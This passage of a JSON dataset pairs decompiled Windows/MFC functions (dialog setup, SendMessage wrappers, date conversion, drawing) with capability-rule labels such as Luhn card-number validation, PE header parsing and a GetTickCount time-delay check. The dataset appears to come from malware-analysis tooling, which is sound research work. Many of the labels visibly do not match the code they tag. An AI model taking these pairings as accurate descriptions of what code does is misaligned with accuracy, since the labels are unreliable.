+ 0x2c));\n            *(in_ECX + 0x2c) = 0;\n            goto code_r0x00425dfa;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hHandle);\n    }\n    if (hEvent == 0) {\n        return 0;\n    }\ncode_r0x00425dfa:\n    (*pcVar1)(hEvent);\n    return 0;\n}\n",
        "token_count": 611
    },
    "0042687b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042687b(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0042b7b9();\n    if (*(iVar1 + 4) != NULL) {\n    // WARNING: Could not recover jumptable at 0x0042688f. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(**(iVar1 + 4) + 0x98))();\n        return;\n    }\n    fcn.00426720(0, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 146
    },
    "00426a40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.00426a40(code **param_1, code *param_2, code *param_3)\n\n{\n    fcn.0041cf54();\n    *param_1 = vtable.CDialog.0;\n    fcn.00459330(param_1 + 0x15, 0, 0x20);\n    param_1[0x1a] = param_3;\n    param_1[0x15] = param_2;\n    param_1[0x16] = param_2 & 0xffff;\n    return param_1;\n}\n",
        "token_count": 132
    },
    "00426f42": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: hMem\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00426f42(uint arg_8h, uint arg_ch, uint hInstance)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    bool bVar5;\n    uint var_48h;\n    uint var_38h;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint hMem;\n    uint var_4h;\n    \n    fcn.00458e78(0x3c);\n    *(unaff_EBP + -0x20) = extraout_ECX;\n    if (*(unaff_EBP + 0x10) == 0) {\n        iVar2 = fcn.0042b7b9();\n        *(unaff_EBP + 0x10) = *(iVar2 + 0xc);\n    }\n    iVar2 = fcn.0042b7b9();\n    piVar1 = *(iVar2 + 0x3c);\n    *(unaff_EBP + -0x28) = piVar1;\n    *(unaff_EBP + -0x14) = 0;\n    *(unaff_EBP + -4) = 0;\n    fcn.00421944(0x10);\n    fcn.00421944(0x7c000);\n    if (piVar1 == NULL) {\n        iVar2 = *(unaff_EBP + 8);\n    }\n    else {\n        iVar2 = (**(*extraout_ECX + 300))(unaff_EBP + -0x48);\n        if (iVar2 == 0) goto code_r0x0042712a;\n        iVar2 = (**(*piVar1 + 0x14))(unaff_EBP + -0x48, *(unaff_EBP + 8));\n    }\n    if (iVar2 == 0) goto code_r0x0042712a;\n    uVar3 = fcn.00423280();\n    fcn.00401680(uVar3);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x18) = 0;\n    iVar4 = fcn.0043aa24(iVar2, unaff_EBP + -0x1c, unaff_EBP + -0x18);\n    bVar5 = iVar4 == 0;\n    if (*0x4ad24c == 0) {\ncode_r0x00427028:\n        if (bVar5) {\ncode_r0x0042702c:\n            fcn.0043a9a4(iVar2);\n            *(unaff_EBP + -4) = 2;\n            fcn.0043a902(*(unaff_EBP + -0x18));\n            uVar3 = fcn.0043a42c();\n            *(unaff_EBP + -0x14) = uVar3;\n            *(unaff_EBP + -4) = 1;\n            fcn.0043a41e();\n            if (*(unaff_EBP + -0x14) != 0) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*(unaff_EBP + -0x14));\n            }\n        }\n    }\n    else {\n        if (bVar5) goto code_r0x0042702c;\n        iVar4 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x2a);\n        if (iVar4 != 0) {\n            iVar4 = fcn.004039d0(iVar2, \"MS Shell Dlg\");\n            bVar5 = iVar4 == 0;\n            if (bVar5) {\n                if (*(unaff_EBP + -0x18) == 8) {\n                    *(unaff_EBP + -0x18) = 0;\n                }\n                goto code_r0x00427028;\n            }\n        }\n    }\n    extraout_ECX[0x11] = -1;\n    extraout_ECX[0xf] = extraout_ECX[0xf] | 0x10;\n    fcn.00420922(extraout_ECX);\n    if (*(unaff_EBP + 0xc) == 0) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = *(*(unaff_EBP + 0xc) + 0x20);\n    }\n    iVar2 = (*_sym.imp.USER32.dll_CreateDialogIndirectParamA)(*(unaff_EBP + 0x10), iVar2, uVar3, fcn.00426919, 0);\n    fcn.004010d0();\n    *(unaff_EBP + -4) = 0xffffffff;\n    if ((*(unaff_EBP + -0x28) != NULL) && ((**(**(unaff_EBP + -0x28) + 0x18))(unaff_EBP + -0x48),  iVar2 != 0)) {\n        (**(*extraout_ECX + 300))(0);\n    }\n    iVar4 = fcn.0041e726();\n    if (iVar4 == 0) {\n        (**(*extraout_ECX + 0x114))();\n    }\n    if ((iVar2 != 0) && ((*(extraout_ECX + 0xf) & 0x10) == 0)) {\n        (*_sym.imp.USER32.dll_DestroyWindow)(iVar2);\n    }\n    if (*(unaff_EBP + -0x14) != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*(unaff_EBP + -0x14));\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(*(unaff_EBP + -0x14));\n    }\ncode_r0x0042712a:\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 1397
    },
    "0042784e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042784e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_ECX;\n    uint var_34h;\n    uint var_2ch;\n    uint var_20h;\n    uint var_1ch;\n    \n    fcn.00459330(&var_34h, 0, 0x34);\n    var_2ch = arg_ch;\n    var_1ch = arg_14h;\n    var_20h = arg_10h;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x102d, arg_8h, &var_34h);\n    return;\n}\n",
        "token_count": 166
    },
    "00427893": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00427893(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_34h;\n    uint var_30h;\n    uint var_14h;\n    \n    fcn.00459330(&var_34h, 0, 0x34);\n    var_30h = arg_8h;\n    var_34h = 4;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x1005, 0, &var_34h);\n    return var_14h;\n}\n",
        "token_count": 133
    },
    "0042a0c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0042a0c5(void)\n\n{\n    uint *puVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CControlSiteFactoryMgr.0;\n    puVar1 = extraout_ECX[8];\n    *(unaff_EBP + -4) = 0;\n    if (puVar1 != NULL) {\n        (***puVar1)(1);\n    }\n    fcn.00429ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    extraout_ECX[1] = vtable.CList_class_IControlSiteFactory___class_IControlSiteFactory__.0;\n    fcn.00429ed2();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 236
    },
    "0042b344": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0042b344(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    fcn.00402f40(\"comctl32.dll\");\n    *(unaff_EBP + -4) = 0;\n    fcn.0042b2c2(unaff_EBP + -0x10);\n    fcn.004010d0();\n    *extraout_ECX = vtable.CComCtlWrapper.0;\n    extraout_ECX[4] = NULL;\n    extraout_ECX[5] = NULL;\n    extraout_ECX[6] = NULL;\n    extraout_ECX[7] = NULL;\n    extraout_ECX[8] = NULL;\n    extraout_ECX[9] = NULL;\n    extraout_ECX[10] = NULL;\n    extraout_ECX[0xb] = NULL;\n    extraout_ECX[0xc] = NULL;\n    extraout_ECX[0xd] = NULL;\n    extraout_ECX[0xe] = NULL;\n    extraout_ECX[0xf] = NULL;\n    extraout_ECX[0x10] = NULL;\n    extraout_ECX[0x11] = NULL;\n    extraout_ECX[0x12] = NULL;\n    extraout_ECX[0x13] = NULL;\n    extraout_ECX[0x14] = NULL;\n    extraout_ECX[0x15] = NULL;\n    extraout_ECX[0x16] = NULL;\n    extraout_ECX[0x17] = NULL;\n    extraout_ECX[0x18] = NULL;\n    extraout_ECX[0x19] = NULL;\n    extraout_ECX[0x1a] = NULL;\n    extraout_ECX[0x1b] = NULL;\n    extraout_ECX[0x1c] = NULL;\n    extraout_ECX[0x1d] = NULL;\n    extraout_ECX[0x1e] = NULL;\n    extraout_ECX[0x1f] = NULL;\n    extraout_ECX[0x20] = NULL;\n    extraout_ECX[0x21] = NULL;\n    extraout_ECX[0x22] = NULL;\n    extraout_ECX[0x23] = NULL;\n    extraout_ECX[0x24] = NULL;\n    extraout_ECX[0x25] = NULL;\n    extraout_ECX[0x26] = NULL;\n    extraout_ECX[0x27] = NULL;\n    extraout_ECX[0x28] = NULL;\n    extraout_ECX[0x29] = NULL;\n    extraout_ECX[0x2a] = NULL;\n    extraout_ECX[0x2b] = NULL;\n    extraout_ECX[0x2c] = NULL;\n    extraout_ECX[0x2d] = NULL;\n    extraout_ECX[0x2e] = NULL;\n    extraout_ECX[0x2f] = NULL;\n    extraout_ECX[0x30] = NULL;\n    extraout_ECX[0x31] = NULL;\n    extraout_ECX[0x32] = NULL;\n    extraout_ECX[0x33] = NULL;\n    extraout_ECX[0x34] = NULL;\n    extraout_ECX[0x35] = NULL;\n    extraout_ECX[0x36] = NULL;\n    extraout_ECX[0x37] = NULL;\n    extraout_ECX[0x38] = NULL;\n    extraout_ECX[0x39] = NULL;\n    extraout_ECX[0x3a] = NULL;\n    extraout_ECX[0x3b] = NULL;\n    extraout_ECX[0x3c] = NULL;\n    extraout_ECX[0x3d] = NULL;\n    extraout_ECX[0x3e] = NULL;\n    extraout_ECX[0x3f] = NULL;\n    extraout_ECX[0x40] = NULL;\n    extraout_ECX[0x41] = NULL;\n    extraout_ECX[0x42] = NULL;\n    extraout_ECX[0x43] = NULL;\n    extraout_ECX[0x44] = NULL;\n    extraout_ECX[0x45] = NULL;\n    extraout_ECX[0x46] = NULL;\n    extraout_ECX[0x47] = NULL;\n    extraout_ECX[0x48] = NULL;\n    extraout_ECX[0x49] = NULL;\n    extraout_ECX[0x4a] = NULL;\n    extraout_ECX[0x4b] = NULL;\n    extraout_ECX[0x4c] = NULL;\n    extraout_ECX[0x4d] = NULL;\n    extraout_ECX[0x4e] = NULL;\n    extraout_ECX[0x4f] = NULL;\n    extraout_ECX[0x50] = NULL;\n    extraout_ECX[0x51] = NULL;\n    extraout_ECX[0x52] = NULL;\n    extraout_ECX[0x53] = NULL;\n    extraout_ECX[0x54] = NULL;\n    extraout_ECX[0x55] = NULL;\n    extraout_ECX[0x56] = NULL;\n    extraout_ECX[0x57] = NULL;\n    extraout_ECX[0x58] = NULL;\n    extraout_ECX[0x59] = NULL;\n    extraout_ECX[0x5a] = NULL;\n    extraout_ECX[0x5b] = NULL;\n    extraout_ECX[0x5c] = NULL;\n    extraout_ECX[0x5d] = NULL;\n    extraout_ECX[0x5e] = NULL;\n    extraout_ECX[0x5f] = NULL;\n    extraout_ECX[0x60] = NULL;\n    extraout_ECX[0x61] = NULL;\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 1391
    },
    "0042b588": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0042b588(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    fcn.00402f40(0x48e1e0);\n    *(unaff_EBP + -4) = 0;\n    fcn.0042b2c2(unaff_EBP + -0x10);\n    fcn.004010d0();\n    *extraout_ECX = vtable.CCommDlgWrapper.0;\n    extraout_ECX[4] = NULL;\n    extraout_ECX[5] = NULL;\n    extraout_ECX[6] = NULL;\n    extraout_ECX[7] = NULL;\n    extraout_ECX[8] = NULL;\n    extraout_ECX[9] = NULL;\n    extraout_ECX[10] = NULL;\n    extraout_ECX[0xb] = NULL;\n    extraout_ECX[0xc] = NULL;\n    extraout_ECX[0xd] = NULL;\n    extraout_ECX[0xe] = NULL;\n    extraout_ECX[0xf] = NULL;\n    extraout_ECX[0x10] = NULL;\n    extraout_ECX[0x11] = NULL;\n    extraout_ECX[0x12] = NULL;\n    extraout_ECX[0x13] = NULL;\n    extraout_ECX[0x14] = NULL;\n    extraout_ECX[0x15] = NULL;\n    extraout_ECX[0x16] = NULL;\n    extraout_ECX[0x17] = NULL;\n    extraout_ECX[0x18] = NULL;\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 415
    },
    "0042b82c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042b82c(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uStack8;\n    \n    fcn.0042b7b9();\n    iVar2 = fcn.00424ceb();\n    if (iVar2 == 0) {\n        uStack8 = 0x4a8690;\n        fcn.00456b8d(&uStack8, 0x49ed44);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "0042b9b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0042b9b0(void)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    uint *puVar2;\n    uint32_t unaff_retaddr;\n    \n    iVar1 = fcn.0042b92e(0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = iVar1 + 0x1c;\n    if (iVar1 == 0) {\n        fcn.0041901a();\n        iVar1 = extraout_ECX;\n    }\n    if (*(iVar1 + 4) != 0) {\n        for (puVar2 = *(*(iVar1 + 4) + ((unaff_retaddr >> 4) % *(iVar1 + 8)) * 4); puVar2 != NULL; puVar2 = *puVar2) {\n            if (puVar2[1] == unaff_retaddr) {\n                return puVar2[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 225
    },
    "0042c830": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.0042c830(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    uint uVar5;\n    int32_t unaff_EBP;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_50h;\n    uint var_4h;\n    \n    fcn.00458eae(0x8c);\n    uVar5 = *(unaff_EBP + 0x1c);\n    iVar1 = **(unaff_EBP + 8);\n    *(unaff_EBP + -0x98) = *(unaff_EBP + 8);\n    if (iVar1 != 0) {\n        puVar3 = fcn.0045924d();\n        uVar2 = *puVar3;\n        puVar3 = fcn.0045924d();\n        *puVar3 = 0;\n        fcn.004595e0(unaff_EBP + -0x90, 0x40, 0x3f, uVar5, *(unaff_EBP + 0xc));\n        piVar4 = fcn.0045924d();\n        if (*piVar4 == 0) {\n            puVar3 = fcn.0045924d();\n            *puVar3 = uVar2;\n        }\n        else {\n            puVar3 = fcn.0045924d();\n            fcn.00418055(*puVar3);\n        }\n        puVar3 = fcn.0045924d();\n        uVar2 = *puVar3;\n        puVar3 = fcn.0045924d();\n        *puVar3 = 0;\n        fcn.004595e0(unaff_EBP + -0x50, 0x40, 0x3f, uVar5, *(unaff_EBP + 0x14));\n        piVar4 = fcn.0045924d();\n        if (*piVar4 == 0) {\n            puVar3 = fcn.0045924d();\n            *puVar3 = uVar2;\n        }\n        else {\n            puVar3 = fcn.0045924d();\n            fcn.00418055(*puVar3);\n        }\n        uVar5 = fcn.00423280();\n        fcn.00401680(uVar5);\n        *(unaff_EBP + -4) = 0;\n        fcn.004443a9(unaff_EBP + -0x94, *(unaff_EBP + 0x20), unaff_EBP + -0x90, unaff_EBP + -0x50);\n        fcn.0042687b(*(unaff_EBP + -0x94), 0x30, *(unaff_EBP + 0x20));\n        fcn.004016d0();\n        fcn.0042c15b();\n        fcn.004010d0();\n    }\n    fcn.00458f31();\n    return;\n}\n",
        "token_count": 724
    },
    "0042d166": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0042d166(int16_t *vtime, ulong *arg_ch)\n\n{\n    int32_t iVar1;\n    uint wVerMinor;\n    uint var_ah;\n    int16_t var_6h;\n    int16_t var_4h;\n    \n    if (arg_ch == NULL) {\n        fcn.00401070(0x80004005);\n    }\n    iVar1 = (*_sym.imp.OLEAUT32.dll_VariantTimeToSystemTime)(vtime, arg_ch);\n    fcn.00459330(&wVerMinor, 0, 0x10);\n    if (((((iVar1 != 0) && (iVar1 = (*_sym.imp.OLEAUT32.dll_UnRegisterTypeLib)(*arg_ch, &wVerMinor),  iVar1 != 0)) &&\n         (*vtime == wVerMinor)) && ((vtime[1] == wVerMinor._2_2_ && (vtime[3] == var_ah)))) &&\n       ((vtime[4] == var_ah._2_2_ && ((vtime[5] == var_6h && (vtime[6] == var_4h)))))) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 282
    },
    "0042d2a1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042d2a1(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    uint uVar3;\n    uint var_24h;\n    \n    piVar2 = fcn.0040ea80(&var_24h);\n    if (piVar2 == NULL) {\n        uVar3 = 0;\n    }\n    else {\n        *arg_8h = piVar2[10] + 0x76c;\n        arg_8h[1] = piVar2[8] + 1;\n        arg_8h[2] = piVar2[0xc];\n        arg_8h[3] = piVar2[6];\n        arg_8h[4] = piVar2[4];\n        arg_8h[5] = piVar2[2];\n        iVar1 = *piVar2;\n        arg_8h[7] = 0;\n        arg_8h[6] = iVar1;\n        uVar3 = CONCAT31(piVar2 >> 8 & 0xffff00 | iVar1 >> 8, 1);\n    }\n    return uVar3;\n}\n",
        "token_count": 264
    },
    "0042d5f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042d5f1(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint uVar2;\n    int32_t lParam;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar2 = 0;\n    iVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x1009, 0, &lParam);\n    if (iVar1 != 0) {\n        uVar2 = 0x216;\n        if (arg_8h == 0) {\n            uVar2 = 0x21e;\n        }\n        fcn.00422a19(0, 0, 0, var_8h - lParam, var_4h - var_ch, uVar2);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 219
    },
    "0042d8ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042d8ff(uint *arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint var_28h;\n    uint var_18h;\n    uint var_8h;\n    \n    fcn.00459330(&var_28h, 0, 0x20);\n    uVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x1007, arg_10h, &var_28h);\n    puVar2 = fcn.0042d20f(&var_28h, 0xffffffff);\n    *arg_8h = *puVar2;\n    arg_8h[1] = puVar2[1];\n    puVar2 = fcn.0042d20f(&var_18h, 0xffffffff);\n    *arg_ch = *puVar2;\n    arg_ch[1] = puVar2[1];\n    return uVar1;\n}\n",
        "token_count": 241
    },
    "0042da11": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042da11(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint var_28h;\n    uint var_18h;\n    uint var_8h;\n    \n    fcn.00459330(&var_28h, 0, 0x20);\n    iVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x1005, 0, &var_28h);\n    if (iVar1 != 0) {\n        puVar2 = fcn.0042d20f(&var_28h, 0xffffffff);\n        *arg_8h = *puVar2;\n        arg_8h[1] = puVar2[1];\n        puVar2 = fcn.0042d20f(&var_18h, 0xffffffff);\n        *arg_ch = *puVar2;\n        arg_ch[1] = puVar2[1];\n    }\n    return iVar1;\n}\n",
        "token_count": 245
    },
    "0042de93": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.0042de93(uchar *arg_8h, uint pdateOut, uint lcid)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    ulong *in_ECX;\n    uchar *puStack36;\n    uint var_1ch;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    puStack36 = 0x42deae;\n    arg_8h_00 = (**0x4ab49c)();\n    var_8h = 0;\n    if (arg_8h == NULL) {\n        arg_8h = 0x48a3e2;\n    }\n    puVar3 = &stack0xffffffdc;\n    puStack36 = arg_8h;\n    var_ch = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n    var_ch = var_ch + 1;\n    iVar2 = fcn.00415f40(&fcn.0042de93::var_ch, var_ch, 2);\n    iVar4 = var_ch;\n    if (iVar2 < 0) {\ncode_r0x0042df18:\n        *(in_ECX + 1) = 1;\n        *in_ECX = 0;\n    }\n    else {\n        if ((var_ch < 0x401) && (cVar1 = fcn.004162a0(var_ch),  cVar1 != '\\0')) {\n            fcn.00458b60();\n        }\n        else {\n            puVar3 = fcn.00416360(iVar4);\n        }\n        puStack36 = puVar3;\n        iVar4 = fcn.00415fc0();\n        if (iVar4 == 0) goto code_r0x0042df18;\n        iVar4 = (*_sym.imp.OLEAUT32.dll_VarDateFromDisp)(iVar4, lcid, pdateOut);\n        if (-1 < iVar4) {\n            *(in_ECX + 1) = 0;\ncode_r0x0042df72:\n            fcn.004160e0();\n            goto code_r0x0042df2d;\n        }\n        if (iVar4 == -0x7ffdfffb) goto code_r0x0042df18;\n        *in_ECX = *0x48e438;\n        *(in_ECX + 1) = 1;\n        if (iVar4 != -0x7ffdfff6) goto code_r0x0042df72;\n    }\n    fcn.004160e0();\ncode_r0x0042df2d:\n    fcn.004566a8(arg_8h_00);\n    return;\n}\n",
        "token_count": 666
    },
    "0042e170": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0042e170(uint *arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    fcn.00459330(&var_2ch, 0, 0x20);\n    uVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x1007, arg_10h, &var_2ch);\n    var_4h = 0;\n    _var_ch = 0;\n    fcn.0042dc93(&var_2ch);\n    *arg_8h = var_ch;\n    arg_8h[1] = uStack12;\n    arg_8h[2] = var_4h;\n    puVar2 = fcn.0042de79(&var_1ch);\n    *arg_ch = *puVar2;\n    arg_ch[1] = puVar2[1];\n    arg_ch[2] = puVar2[2];\n    return uVar1;\n}\n",
        "token_count": 287
    },
    "0042e1dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0042e1dd(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    fcn.00459330(&var_2ch, 0, 0x20);\n    iVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x1005, 0, &var_2ch);\n    if (iVar1 != 0) {\n        _var_ch = 0;\n        var_4h = 0;\n        fcn.0042dc93(&var_2ch);\n        *arg_8h = var_ch;\n        arg_8h[1] = uStack12;\n        arg_8h[2] = var_4h;\n        puVar2 = fcn.0042de79(&var_1ch);\n        *arg_ch = *puVar2;\n        arg_ch[1] = puVar2[1];\n        arg_ch[2] = puVar2[2];\n    }\n    return iVar1;\n}\n",
        "token_count": 293
    },
    "0042edf5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042edf5(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t Y, uint crColor)\n\n{\n    int32_t in_ECX;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.GDI32.dll_SetBkColor)(*(in_ECX + 4), crColor);\n    var_10h = arg_8h;\n    var_8h = arg_8h + arg_10h;\n    var_ch = arg_ch;\n    var_4h = arg_ch + Y;\n    (*_sym.imp.GDI32.dll_ExtTextOutA)(*(in_ECX + 4), 0, 0, 2, &var_10h, 0, 0, 0);\n    return;\n}\n",
        "token_count": 208
    },
    "0042ee41": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ee41(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint var_4h;\n    \n    fcn.0042edf5(arg_8h, arg_ch, arg_10h + -1, 1, arg_18h);\n    fcn.0042edf5(arg_8h, arg_ch, 1, arg_14h + -1, arg_18h);\n    fcn.0042edf5(arg_8h + arg_10h, arg_ch, 0xffffffff, arg_14h, arg_1ch);\n    fcn.0042edf5(arg_8h, arg_ch + arg_14h, arg_10h, 0xffffffff, arg_1ch);\n    return;\n}\n",
        "token_count": 204
    },
    "0042ef8a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042ef8a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint unaff_ESI;\n    uint var_40h;\n    uint var_29h;\n    uint var_24h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    fcn.00459330(&var_40h, 0, 0x3c);\n    var_40h = arg_8h;\n    var_29h._0_1_ = 1;\n    uVar1 = fcn.00458fdb(&var_24h, 0x20, arg_ch, 0xffffffff);\n    fcn.0040e7f0(uVar1);\n    fcn.0042eeab(&var_40h, arg_10h);\n    fcn.004566a8(unaff_ESI);\n    return;\n}\n",
        "token_count": 230
    },
    "0042f731": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
